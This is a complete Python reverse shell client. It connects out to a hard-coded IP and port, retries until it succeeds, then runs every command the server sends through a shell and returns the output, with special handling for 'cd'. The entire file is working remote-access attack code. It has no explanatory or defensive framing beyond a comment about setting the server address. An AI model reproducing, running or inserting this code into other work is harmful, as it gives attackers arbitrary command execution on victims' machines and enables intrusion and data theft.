import socket
import os
import subprocess
import time

SERVER_IP = "172.27.9.175"   # <-- set this to your server's reachable IP
PORT = 9998
BUFFER = 4096

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            s.connect((SERVER_IP, PORT))
            print(f"[OK] Connected to {SERVER_IP}:{PORT}")
            return s
        except Exception as e:
            print(f"[WARN] Connect failed: {e}. Retrying in 3s...")
            time.sleep(3)

def main():
    s = connect()

    try:
        while True:
            data = s.recv(BUFFER)
            if not data:
                print("[INFO] Server closed connection")
                break

            command = data.decode("utf-8").strip()
            print(f"[DEBUG] Received command: {command!r}")

            # handle cd specially
            if command.lower().startswith("cd "):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    s.sendall(f"[OK] Changed dir to {os.getcwd()}\n".encode())
                except Exception as e:
                    s.sendall(f"[ERROR] cd: {e}\n".encode())
                continue

            if command.lower() == "quit":
                print("[INFO] Received quit, closing")
                break

            # execute the command
            proc = subprocess.Popen(command, shell=True,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            stdout, stderr = proc.communicate()
            output = stdout + stderr
            if not output:
                output = b"\n"
            try:
                s.sendall(output)
            except BrokenPipeError:
                print("[ERROR] Broken pipe when sending output")
                break
    except Exception as e:
        print(f"[ERROR] main loop exception: {e}")
    finally:
        s.close()
        print("[INFO] Socket closed")

if __name__ == "__main__":
    main()
